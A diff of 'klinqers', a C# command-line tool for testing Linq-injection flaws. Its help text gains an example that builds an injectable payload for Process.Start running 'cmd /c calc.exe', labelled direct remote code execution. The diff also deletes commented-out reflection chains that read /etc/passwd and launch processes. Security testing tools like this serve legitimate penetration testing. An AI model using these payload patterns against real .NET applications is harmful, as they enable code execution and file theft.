@@ -1,4 +1,5 @@
-﻿using System;
+﻿// James Dickson 2021, License GPL 2.0 (see file in project)
+using System;
 using System.Collections.Generic;
 using System.Reflection;
 using System.Text;
@@ -8,8 +9,6 @@ namespace klinqers
 {
     class MainClass
     {
-
-
         static void printHelp()
         {
             Console.WriteLine("--assemblies           Creating list for all assemblies in appdomain");
@@ -21,23 +20,20 @@ namespace klinqers
             Console.WriteLine("\r\n");
 
             Console.WriteLine("Example:\r\n");
-            Console.WriteLine("Example 1 - create an injectable code");
+            Console.WriteLine("Example 1 - create an injectable code for File.Exists()");
             Console.WriteLine("klinqers.exe --call \"System.IO.File.Exists(c:/windows/system32/drivers/etc/hosts)\"");
 
             Console.WriteLine("\r\n");
+
+            Console.WriteLine("Example 2 - create an injectable code for Process.Start() .. if that works it is direct RCE");
+            Console.WriteLine("klinqers.exe --call \"System.Diagnostics.Process.Start(cmd,/c calc.exe)\"");
+
             Console.WriteLine("\r\n");
         }
 
         public static void Main(string[] args)
         {
             Console.WriteLine("\r\n [klinqers] - an app for testing Linq-injections (License GPL 2.0 - James Dickson 2021)\r\n");
-
-            //"c:/windows/system32/hosts".Split(";".ToCharArray())
-            //"".GetType().Assembly.GetType("System.IO.File").GetMethods()[29].Invoke(null, new object[] { }).ToString();
-
-            //object obj = "".GetType().Assembly.GetType("System.IO.File").GetMethods()[29].Invoke(null, "/etc/passwd".Split(";".ToCharArray())).ToString();
-
-            //object obj = "".GetType().Assembly.GetType("System.AppDomain").GetMethods()[18].Invoke("".GetType().Assembly.GetType("System.AppDomain").GetProperty("CurrentDomain").GetValue(null), "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;System.Diagnostics.Process".Split(";".ToCharArray())).GetType().GetMethods()[44].Invoke(null, "ls;-l".Split(";".ToCharArray()));
 
             if (args.Length < 1)
             {
